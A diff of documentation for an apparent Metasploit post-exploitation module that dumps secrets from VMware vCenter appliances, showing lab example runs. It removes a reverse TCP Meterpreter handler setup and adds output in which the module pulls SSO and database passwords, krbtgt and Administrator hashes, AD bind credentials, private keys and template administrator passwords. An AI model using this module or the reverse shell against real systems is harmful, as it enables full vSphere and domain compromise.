@@ -47,85 +47,141 @@ DATA-ENCIPHERMENT key extracted from VMAFD. Defaults to true.
 Example run from meterpreter session on vCenter appliance version 7.0.2
 
 ```
-msf6 > use multi/handler
-set payload linux/x86/meterpreter/reverse_tcp
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
-payload => linux/x86/meterpreter/reverse_tcp
-set LPORT 4444
-msf6 exploit(multi/handler) > set LHOST 192.168.101.10
-LHOST => 192.168.101.10
-msf6 exploit(multi/handler) > set LPORT 4444
-LPORT => 4444
-msf6 exploit(multi/handler) > exploit
-
-[*] Started reverse TCP handler on 192.168.101.10:4444 
-[*] Sending stage (989032 bytes) to 192.168.100.11
-[*] Meterpreter session 1 opened (192.168.101.10:4444 -> 192.168.100.11:53410 ) at 2022-04-30 14:04:21 -0400
-
-meterpreter > bg
-[*] Backgrounding session 1...
 msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
 msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
 session => 1
 msf6 post(linux/gather/vcenter_secrets_dump) > dump
 
 [*] Gathering vSphere SSO domain information ...
-[*] vSphere Hostname and IPv4: vcenteralpha..cesium137.io [192.168.100.11]
-[+] vSphere SSO DC DN: cn=vcenteralpha..cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local
-[+] vSphere SSO DC PW: .AwoZ1;wd>x_b=M1FQ'}
+[*] vSphere Hostname and IPv4: vcenterdelta.cesium137.io [192.168.100.70]
+[+] vSphere SSO DC DN: cn=vcenterdelta.cesium137.io,ou=Domain Controllers,dc=delta,dc=vsphere,dc=local
+[+] vSphere SSO DC PW: *6{ K3Ei*@<J[.gd5c3o
 [*] Extract vmdird tenant AES encryption keys ...
-[+] vSphere Tenant AES encryption key: OY;OTk3<W}tH[ze| hex: 0x4f593b4f546b333c577d74485b7a657c
+[+] vSphere Tenant AES encryption key: K-Z(x7wf35{E"I2v hex: 0x4b2d5a287837776633357b4522493276
 [*] Extracting PostgreSQL database credentials ...
-[+] VCDB Name: VCDB User: vc PW: my6h@)IN1jW$nHT{
+[+] VCDB Name: VCDB User: vc PW: 6!24A3W5LekCOPK=
 [*] Extracting vSphere SSO domain information ...
 [*] Dumping vmdir schema to LDIF ...
-[+] LDIF Dump: /home/cs137/.msf4/loot/20220430140904_default_192.168.100.11_vmdir_231364.ldif
+[+] LDIF Dump: /home/cs137/.msf4/loot/20220502094947_default_192.168.100.70_vmdir_313310.ldif
 [*] Processing vmdir LDIF (this may take several minutes) ...
 [*] Processing LDIF entries ...
 [*] Processing SSO account hashes ...
-[+] vSphere SSO User Credential: cn=vcenteralpha..cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local:$dynamic_82$f48caa19007e8bb3d76a7d172e2d1976f4747e0ed84159a712eb58156ede7478827909bf4acf9f71b74616ce5110d99b8426d8b3295b02c04aacff3c27607ab8$HEX$9374651ada3414775604fbdb150c8cdc
-[+] vSphere SSO User Credential: CN=waiter 66bac9fd-6a99-43eb-8661-1295c39e9e4d,cn=users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$8335fa00d0498f1028691aced7d8945be0fa1f689dc628a3307ec7918a8fcdb04587ebd8a6dc1b14cacc0c11e4f84c5e022108e0950b62dc63f3f37c0a3b3453$HEX$4108122797d8894b9963e5ac943918b9
-[+] vSphere SSO User Credential: cn=krbtgt/ALPHA.VSPHERE.LOCAL,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$0da378937caf846413b0a9a328e9fe901513bddddea9a0de5ca520f4d7eca9d2eeb7287a26f0d079941bb46df36a5b321c53b807e59c55b10bb62ff260e28021$HEX$266ca458d66911df01347b372939ae2a
-[+] vSphere SSO User Credential: cn=K/M,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$c20ca496510e8e6a0d3d9aa470dfe0baf06ccfb2ecc2e4952d232859e8fc22ccd3108926eb115574043652157db3f1d557af1cd1580190546178758eee57834a$HEX$22209783f4c187b777a31c2a814c2ff7
-[+] vSphere SSO User Credential: cn=Administrator,cn=Users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$f96cd214646ba2e4e21774a183f18572bc3d6c4174801d0523cbdc04d02bf69b102bfe9d68fdd71c5866f4972b2359516e65f59c4bda6eebd3cdca59b5f55be8$HEX$4f267135b496ff3119afc21fefda8643
-[+] vSphere SSO User Credential: cn=vmca/vcenteralpha..cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$ee963a2f36d38a73e5cf4be729e7be4f491c97fc91b3e9bed96216de9bf72914d1442c49650b07366e9347369ce892d823e06613195027e3f44dfd50662b98dc$HEX$842fdf0b5b972c8f722fb3139142231d
-[+] vSphere SSO User Credential: cn=ldap/vcenteralpha..cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$85523e5ad2ac353b925a0cc9f0fad88c881b17d5b218fdd568fb819a7bc58abf7e8783013e22468c657cae7f776ec77fb8b0ad815ef5cdc6ea114c701f19fa52$HEX$4faf7011a11a4939216a1211a4b08cea
-[+] vSphere SSO User Credential: cn=DNS/vcenteralpha..cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$ad40b15f98588bc0c856a0f881ea857d6f3442a6755b9c33e40c7960d1833414d25ef96120f9416fca96d0ecfe3df6ddc1e992e5881baeacdcc4610bd43eda79$HEX$f3d9e1c742d9342c78c1825ab5b7efee
-[+] vSphere SSO User Credential: cn=host/vcenteralpha..cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$bbcb9c30d8c1a40f409d24fe6ede60df7bf4860a9bdd50b146d063a194fdadb0df80d81ea5ea48a377f20709fa1c22f696facde785b160ceb0eb92eb5f8c5308$HEX$5fab6ef4332396fb4b4410cca448d52d
+[+] vSphere SSO User Credential: CN=workload_storage_management-07afcee6-c2e2-4d0a-aa28-0305ab5825a4,cn=ServicePrincipals,dc=delta,dc=vsphere,dc=local:$dynamic_82$dc5845fe5c4efe7dcfc330d1dfc41c9e537976c8e03198e47a8642ac766745939ed794393f95567e579ddf473050754d2c0b1f751c077a5c963ceda7d6d00122$HEX$edb031a9330b1d1ff17527976a601107
+[+] vSphere SSO User Credential: cn=vcenterdelta.cesium137.io,ou=Domain Controllers,dc=delta,dc=vsphere,dc=local:$dynamic_82$d857c278b1dfa799e293f0f35551d29b01973c24ef9e2c0e079d09049826ca824757f8377e7646e003272a39ae459a66c5fca54ac76eb67ddc5d1133cb4c4628$HEX$4ae8badb536deab2c3be64d3a1dfeb2e
+[+] vSphere SSO User Credential: CN=waiter-0ad33e8d-0ca0-4912-8eb0-0a80a16fda82,cn=users,dc=delta,dc=vsphere,dc=local:$dynamic_82$9a9dd8ec92a332b91b7602d45404a144973c75f54111ecf7cdfa70cea29e358838132f8380361091a40efdf52c5ac34cfd988574e489a83e2c1f1438c764bad0$HEX$2971d8fd5160de2e71a0dfa744af5d6b
+[+] vSphere SSO User Credential: cn=krbtgt/DELTA.VSPHERE.LOCAL,cn=users,dc=DELTA,dc=VSPHERE,dc=LOCAL:$dynamic_82$41437d26f1d4c2cdc67cff7ec66f91da643cb4b331fc00fa052ace43e4eae7ef277f9b9b05d5c06c46f5b73bc2132ed772552274464098d2479604161a001d32$HEX$5a21a4b810348c78f9997a3c405f3340
+[+] vSphere SSO User Credential: cn=K/M,cn=users,dc=DELTA,dc=VSPHERE,dc=LOCAL:$dynamic_82$aa0ef201580566738898162a079c70daa0bb19be0927d6b44ac3d65724df1e14cd6c273c132cd117b98ed8c7b37d2ae861d96e6ff28e97e81f54629072a83e62$HEX$031df0af1964ea1e5c733541f2f89a7d
+[+] vSphere SSO User Credential: cn=Administrator,cn=Users,dc=delta,dc=vsphere,dc=local:$dynamic_82$cd4362341bb01e2de096c262c59e3c6f8bedf78ae96f378de57e369d5071f114fba4c43c4d577317ea3d923eafa9b9a6f6154a10d0e81f7fa00fb711b3519a8c$HEX$0155fb261f868fbf8f3feda9139acc50
+[+] vSphere SSO User Credential: cn=vmca/vcenterdelta.cesium137.io@DELTA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=delta,dc=vsphere,dc=local:$dynamic_82$b478eb780a9f43960541a236b4f258bf9d7726f76d6f9d13f25fc815bac002b191be96a90c87bf607b54e13769878b5863cde7eb12b151db5c5892e9b00e5f48$HEX$a56c39678fd290619f726e31c5d6fce8
+[+] vSphere SSO User Credential: cn=ldap/vcenterdelta.cesium137.io@DELTA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=delta,dc=vsphere,dc=local:$dynamic_82$efeb6777719ccb7278a6c216e3a307bc0a4a9ecbf240a36a6947161dbd44e143cb8fa9712f2629e7022bb2bcdf3c144b7ecbbc499f15dd3791e920205ec7fcba$HEX$bb3eddcba08bf93c372f23a45c5fb651
+[+] vSphere SSO User Credential: cn=DNS/vcenterdelta.cesium137.io@DELTA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=delta,dc=vsphere,dc=local:$dynamic_82$059761db3117ce52c864cf5dab7b6320f47d0e09c1ff3afaa0835fe4775aa0669a09ee26412e15bfc8337a9747e73e4ffab1859292e716dba0e92104708332a6$HEX$4629f7e9c587f6d1b57b2f56e96bf05a
+[+] vSphere SSO User Credential: cn=host/vcenterdelta.cesium137.io@DELTA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=delta,dc=vsphere,dc=local:$dynamic_82$6b11a2b58752e8409f57bc72b45e6599209714000b8a17e95d661663d54d691ce013be2700fa6c8e30e6d98259d1810c5f883fcc8099bd16342e6a4c0d179895$HEX$2a14a8f480ca071f6edffd3720732d5d
+[*] Processing SSO identity sources ...
+[*] Found SSO Identity Source Credential:
+[+] IDENTITY_STORE_TYPE_VMWARE_DIRECTORY @ ldap://vcenterdelta.cesium137.io:389:
+[+] SSOUSER: vcenterdelta.cesium137.io@delta.vsphere.local
+[+] SSOPASS: *6{ K3Ei*@<J[.gd5c3o
+[+] SSODOMAIN: delta.vsphere.local
+[*] Found SSO Identity Source Credential:
+[+] IDENTITY_STORE_TYPE_LDAP_WITH_AD_MAPPING @ ldap://cesium137.io:
+[+] SSOUSER: CESIUM137\ldap
+[+] SSOPASS: ThisIsSecret!
+[+] SSODOMAIN: cesium137.io
+[*] Extracting certificates from vSphere platform ...
+[+] VMCA_ROOT key: /home/cs137/.msf4/loot/20220502094949_default_192.168.100.70_vmca_533515.key
+[+] VMCA_ROOT cert: /home/cs137/.msf4/loot/20220502094950_default_192.168.100.70_vmca_297516.pem
+[+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220502094951_default_192.168.100.70_idp_205474.key
+[+] SSO_STS_IDP cert: /home/cs137/.msf4/loot/20220502094951_default_192.168.100.70_idp_311054.pem
+[+] MACHINE_SSL_CERT key: /home/cs137/.msf4/loot/20220502094954_default_192.168.100.70___MACHINE_CERT_414635.key
+[+] MACHINE_SSL_CERT cert: /home/cs137/.msf4/loot/20220502094955_default_192.168.100.70___MACHINE_CERT_332870.pem
+[+] MACHINE key: /home/cs137/.msf4/loot/20220502094957_default_192.168.100.70_machine_023374.key
+[+] MACHINE cert: /home/cs137/.msf4/loot/20220502094958_default_192.168.100.70_machine_922815.pem
+[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220502095000_default_192.168.100.70_vspherewebclien_713962.key
+[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220502095000_default_192.168.100.70_vspherewebclien_136515.pem
+[+] VPXD key: /home/cs137/.msf4/loot/20220502095002_default_192.168.100.70_vpxd_481212.key
+[+] VPXD cert: /home/cs137/.msf4/loot/20220502095003_default_192.168.100.70_vpxd_493549.pem
+[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220502095005_default_192.168.100.70_vpxdextension_165639.key
+[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220502095005_default_192.168.100.70_vpxdextension_834804.pem
+[+] HVC key: /home/cs137/.msf4/loot/20220502095007_default_192.168.100.70_hvc_915656.key
+[+] HVC cert: /home/cs137/.msf4/loot/20220502095008_default_192.168.100.70_hvc_016439.pem
+[+] DATA-ENCIPHERMENT key: /home/cs137/.msf4/loot/20220502095010_default_192.168.100.70_dataenciphermen_687504.key
+[+] DATA-ENCIPHERMENT cert: /home/cs137/.msf4/loot/20220502095010_default_192.168.100.70_dataenciphermen_813371.pem
+[+] SMS key: /home/cs137/.msf4/loot/20220502095012_default_192.168.100.70_sms_self_signed_661559.key
+[+] SMS cert: /home/cs137/.msf4/loot/20220502095013_default_192.168.100.70_sms_self_signed_175435.pem
+[+] WCP key: /home/cs137/.msf4/loot/20220502095015_default_192.168.100.70_wcp_787364.key
+[+] WCP cert: /home/cs137/.msf4/loot/20220502095016_default_192.168.100.70_wcp_947384.pem
+[*] Searching for secrets in VM Guest Customization Specification XML ...
+[*] Processing vpx_customization_spec 'Good Win10 Template with Local and Domain Join' ...
+[*] Validating data encipherment key ...
+[*] Initial administrator account password found for vpx_customization_spec 'Good Win10 Template with Local and Domain Join':
+[+] Built-in administrator PW: SamIAm!
+[*] AD domain join account found for vpx_customization_spec 'Good Win10 Template with Local and Domain Join':
+[+] AD User: administrator@cesium137.io
+[+] AD Pass: IAmSam!
+[*] Processing vpx_customization_spec 'Borked Win10 Template' ...
+[*] Validating data encipherment key ...
+[!] Could not associate encryption public key with any of the private keys extracted from vCenter, skipping
+[*] Processing vpx_customization_spec 'Good Win10 Template with Local' ...
+[*] Validating data encipherment key ...
+[*] Initial administrator account password found for vpx_customization_spec 'Good Win10 Template with Local':
+[+] Built-in administrator PW: SamIAm!
+[*] Post module execution completed
+```
+
+Example run from vCenter 6.0 Update 3j
+
+```
+msf6 post(linux/gather/vcenter_secrets_dump) > dump
+
+[*] Gathering vSphere SSO domain information ...
+[*] vSphere Hostname and IPv4: vcenteralpha [192.168.100.60]
+[+] vSphere SSO DC DN: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local
+[+] vSphere SSO DC PW: <PMW{T:4mnb@UBs/$f(w
+[*] Extract vmdird tenant AES encryption keys ...
+[+] vSphere Tenant AES encryption key: (>d%>D3'i@rAj}!" hex: 0x283e64253e443327694072416a7d2122
+[*] Extracting PostgreSQL database credentials ...
+[+] VCDB Name: VCDB User: vc PW: 4yFcqZ2$m^&H<K?z
+[*] Extracting vSphere SSO domain information ...
+[*] Dumping vmdir schema to LDIF ...
+[+] LDIF Dump: /home/cs137/.msf4/loot/20220502085244_default_192.168.100.60_vmdir_046059.ldif
+[*] Processing vmdir LDIF (this may take several minutes) ...
+[*] Processing LDIF entries ...
+[*] Processing SSO account hashes ...
+[+] vSphere SSO User Credential: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local:$dynamic_82$95fe2a1c250329ff99f3ebf364a58f1ee4263560c30c8010c9774b4f5bf151ef3df4b378ab88a2e3629f714ed1b0060f3ae10b7bd7533d025f47d33542bf8ade$HEX$28d03ba88a83c83ae1d999b77259670c
+[+] vSphere SSO User Credential: CN=waiter 514f2778-d8c0-49aa-a10b-1951699cc8c6,cn=users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$495c53a6dd4b813638608feb0b4a1b27045d41e36e798c68ebdb312edc2f16c77d780c2b4fc6bed438cfd0ef743f1c1e0363692bd2c195371c2d4dd0b9862f39$HEX$b74fe42af9579d6c5536a50872c9eedf
+[+] vSphere SSO User Credential: cn=krbtgt/ALPHA.VSPHERE.LOCAL,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$1c01a034aadd563bea5be04b9e74dbc5bb9ac37694f58bda6eea0e83df97bc64e5fdf932991a9bcaaf82da6300542e8d8d51c16282e9aaa08da2c6c65a8b7cdc$HEX$2434b5c538e31bb3854bcd277a5f63ab
+[+] vSphere SSO User Credential: cn=K/M,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$525d688d4614db9939ffdba8e41e76bc3bd473b0cc4fdeac0994042d3a5a7adc9c8e46040c846d6c7f449f7f94f9d3370cc554ab668dcd3d1006ca38a60fb70d$HEX$fd6001dd5be548498d94bf08641d657d
+[+] vSphere SSO User Credential: cn=Administrator,cn=Users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$3a4fc4fbacbc6d10e4787383841ebc38fc20ebbb7780692ee0c5fa4b1a2bd675b7c41e8604f4a0eba9546993b971790115279281a108e6e21f4b83740fae449f$HEX$db1d08918cc2eb7bb372545b449643ca
+[+] vSphere SSO User Credential: cn=vmca/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$6d7a381d442a674bcc730604160c6963adc937a45a14b9d8e750b55fd3500e54c1bd739968a611a63f747db0ebbe8d31f0d96e5b84a2d72c3c79f922e922adc7$HEX$68fbf3edaba87c972f2423d670377cd7
+[+] vSphere SSO User Credential: cn=ldap/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$f584f632b79113f1a5f31d0d8e1df094438fd1644140fd3692a880e4c3ddb8a25969a71ec0e10b31c61aa256217cc0e4c014a21350645b2a3fb7327d0ee5f96a$HEX$9cfee2bcd297134f1d5a921c20f373e8
+[+] vSphere SSO User Credential: cn=host/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$ac83726dabc4a021b7737b1e696eba9067e73fc8058e719733b2f4ebded115ae653dd75f13ec26b6a641986c772b20bf37be999c9978d220e94f1d0eeab9d3b8$HEX$91dae8ef6feae8880dd9708664040598
 [*] Processing SSO identity sources ...
 [*] Found SSO Identity Source Credential:
 [+] IDENTITY_STORE_TYPE_VMWARE_DIRECTORY @ ldap://localhost:389:
-[+] SSOUSER: vcenteralpha..cesium137.io@alpha.vsphere.local
-[+] SSOPASS: .AwoZ1;wd>x_b=M1FQ'}
+[+] SSOUSER: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,DC=alpha,DC=vsphere,DC=local
+[+] SSOPASS: <PMW{T:4mnb@UBs/$f(w
 [+] SSODOMAIN: alpha.vsphere.local
-[*] Found SSO Identity Source Credential:
-[+] IDENTITY_STORE_TYPE_LDAP_WITH_AD_MAPPING @ ldap://cesium137.io:3268:
-[+] SSOUSER: CESIUM137\ldap
-[+] SSOPASS: SamIAm!
-[+] SSODOMAIN: cesium137.io
 [*] Extracting certificates from vSphere platform ...
-[+] VMCA_ROOT key: /home/cs137/.msf4/loot/20220430140906_default_192.168.100.11_vmca_936623.key
-[+] VMCA_ROOT cert: /home/cs137/.msf4/loot/20220430140907_default_192.168.100.11_vmca_555488.pem
-[+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220430140909_default_192.168.100.11_idp_464049.key
-[+] SSO_STS_IDP cert: /home/cs137/.msf4/loot/20220430140909_default_192.168.100.11_idp_273306.pem
-[+] MACHINE_SSL_CERT key: /home/cs137/.msf4/loot/20220430140910_default_192.168.100.11_ssl_509899.key
-[+] MACHINE_SSL_CERT cert: /home/cs137/.msf4/loot/20220430140910_default_192.168.100.11_ssl_581440.pem
-[+] DATA-ENCIPHERMENT key: /home/cs137/.msf4/loot/20220430140911_default_192.168.100.11_data_110634.key
-[+] DATA-ENCIPHERMENT cert: /home/cs137/.msf4/loot/20220430140911_default_192.168.100.11_data_051751.pem
-[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220430140912_default_192.168.100.11_webclient_908714.key
-[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220430140913_default_192.168.100.11_webclient_473307.pem
-[+] VPXD key: /home/cs137/.msf4/loot/20220430140913_default_192.168.100.11_vpxd_232400.key
-[+] VPXD cert: /home/cs137/.msf4/loot/20220430140914_default_192.168.100.11_vpxd_225856.pem
-[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220430140915_default_192.168.100.11_vpxdext_365675.key
-[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220430140915_default_192.168.100.11_vpxdext_458408.pem
+[+] VMCA_ROOT key: /home/cs137/.msf4/loot/20220502085246_default_192.168.100.60_vmca_730841.key
+[+] VMCA_ROOT cert: /home/cs137/.msf4/loot/20220502085246_default_192.168.100.60_vmca_303377.pem
+[!] vmwSTSPrivateKey was not found in vmdir, checking for legacy ssoserverSign key PEM files ...
+[-] Unable to query IDM tenant information, cannot validate ssoserverSign certificate against IDM
+[!] Could not reconcile vmdir STS IdP cert chain with cert chain advertised by IDM - this credential may not work
+[+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220502085248_default_192.168.100.60_idp_374103.key
+[+] SSO_STS_IDP cert: /home/cs137/.msf4/loot/20220502085249_default_192.168.100.60_idp_897642.pem
+[+] MACHINE_SSL_CERT key: /home/cs137/.msf4/loot/20220502085251_default_192.168.100.60___MACHINE_CERT_266327.key
+[+] MACHINE_SSL_CERT cert: /home/cs137/.msf4/loot/20220502085252_default_192.168.100.60___MACHINE_CERT_869538.pem
+[+] MACHINE key: /home/cs137/.msf4/loot/20220502085255_default_192.168.100.60_machine_898622.key
+[+] MACHINE cert: /home/cs137/.msf4/loot/20220502085255_default_192.168.100.60_machine_140140.pem
+[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220502085257_default_192.168.100.60_vspherewebclien_752462.key
+[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220502085258_default_192.168.100.60_vspherewebclien_504719.pem
+[+] VPXD key: /home/cs137/.msf4/loot/20220502085259_default_192.168.100.60_vpxd_602894.key
+[+] VPXD cert: /home/cs137/.msf4/loot/20220502085300_default_192.168.100.60_vpxd_332516.pem
+[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220502085302_default_192.168.100.60_vpxdextension_363126.key
+[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220502085303_default_192.168.100.60_vpxdextension_268974.pem
+[+] SMS key: /home/cs137/.msf4/loot/20220502085304_default_192.168.100.60_sms_self_signed_164497.key
+[+] SMS cert: /home/cs137/.msf4/loot/20220502085305_default_192.168.100.60_sms_self_signed_765910.pem
 [*] Searching for secrets in VM Guest Customization Specification XML ...
-[*] Initial administrator account password found for vpx_customization_spec 'Windows 10 Ent No Domain Join':
-[+] Built-in administrator PW: IAmSam!
-[*] Initial administrator account password found for vpx_customization_spec 'Windows 10 Ent':
-[+] Built-in administrator PW: Metasploit1$
-[*] AD domain join account found for vpx_customization_spec 'Windows 10 Ent':
-[+] AD User: administrator@cesium137.io
-[+] AD Pass: ThisIsSecret!
+[!] No vpx_customization_spec entries evident
 [*] Post module execution completed
 ```
